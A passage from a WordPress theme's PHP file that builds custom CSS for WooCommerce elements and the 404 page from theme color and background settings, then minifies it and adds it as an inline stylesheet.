   color: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce #breadcrumb a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce-page .content-page-inner input.button, .woocommerce-page .content-page-inner a.button {
   background: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce-page .content-page-inner input.button:hover, .woocommerce-page .content-page-inner a.button:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce-cart-form__contents .woocommerce-cart-form__cart-item td.product-remove a.remove {
   background: <?php echo esc_attr($theme_color); ?>;
}
.shop-loop-actions .quickview a:hover, .shop-loop-actions .yith-wcwl-add-to-wishlist a:hover, .shop-loop-actions .yith-compare a:hover, .shop-loop-actions .add-to-cart a:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.shop-loop-price .price {
   color: <?php echo esc_attr($theme_color); ?>;
}
.gva-countdown .countdown-times > div.day {
   color: <?php echo esc_attr($theme_color); ?>;
}
.product_list_widget.cart_list .widget-product .name a:hover {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.product_list_widget.cart_list .widget-product .remove {
   background: <?php echo esc_attr($theme_color); ?>;
}
.woo-display-mode > a:hover, .woo-display-mode > a:active, .woo-display-mode > a:focus, .woo-display-mode > a.active {
   background: <?php echo esc_attr($theme_color); ?>;
}
.filter-sidebar .filter-sidebar-inner.layout-offcavas .filter-close {
   background: <?php echo esc_attr($theme_color); ?>;
}
.woocommerce .button[type*="submit"] {
   background: <?php echo esc_attr($theme_color); ?>;
   color: #fff;
}
.woocommerce .button[type*="submit"]:hover {
   background: <?php echo esc_attr($theme_color); ?>;
}
.widget.widget_layered_nav ul > li a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget.widget_product_categories li.current-cat > a {
   color: <?php echo esc_attr($theme_color); ?> !important;
}
.widget.widget_product_categories ul.product-categories > li.has-sub .cat-caret:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}
.widget.widget_product_categories ul.product-categories > li ul a:hover {
   color: <?php echo esc_attr($theme_color); ?>;
}

<?php } //End Color Theme ?> 




<?php if( !empty($nfpage_bg_color) ){ ?>
   .not-found-wrapper{
      background-color: <?php echo esc_attr($nfpage_bg_color) ?>;
   }
<?php }  ?>

<?php if( !empty($nfpage_bg_image_url) ){ ?>
   .not-found-wrapper{
      background-image: url('<?php echo esc_attr($nfpage_bg_image_url) ?>');
   }
<?php }  ?>

<?php
   $styles = ob_get_clean();
   $styles = preg_replace( '!/\*[^*]*\*+([^/][^*]*\*+)*/!', '', $styles );
   $styles = str_replace( array( "\r\n", "\r", "\n", "\t", '  ', '   ', '    ' ), '', $styles );
   if($styles){
      wp_enqueue_style( 'inusti-custom-style-color', INUSTI_THEME_URL . '/css/custom_script.css');
      wp_add_inline_style( 'inusti-custom-style-color', $styles );
   }
}

add_action( 'wp_enqueue_scripts', 'inusti_custom_color_theme', 99999 );